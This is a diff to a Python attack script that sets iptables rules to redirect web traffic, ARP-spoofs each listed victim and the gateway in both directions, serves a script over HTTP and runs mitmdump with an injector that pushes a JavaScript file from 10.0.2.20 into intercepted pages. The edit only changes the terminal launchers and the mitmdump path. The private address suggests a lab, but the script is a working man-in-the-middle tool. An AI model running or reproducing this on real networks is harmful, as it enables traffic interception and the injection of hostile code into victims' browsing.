@@ -14,8 +14,8 @@ os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIREC
 os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
 
 for victim in victims:
-	os.system("arpspoof -i ens33 -t " + victim + " " + gateway + " &")
-	os.system("arpspoof -i ens33 -t " + gateway + " " + victim + " &")
+	os.system("xterm -e arpspoof -i ens33 -t " + victim + " " + gateway + " &")
+	os.system("xterm -e arpspoof -i ens33 -t " + gateway + " " + victim + " &")
 
-os.system("gnome-terminal -e 'python3 httpServer.py' &")
-os.system("~/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
+os.system("xterm -hold -e 'python3 httpServer.py' &")
+os.system("/usr/local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
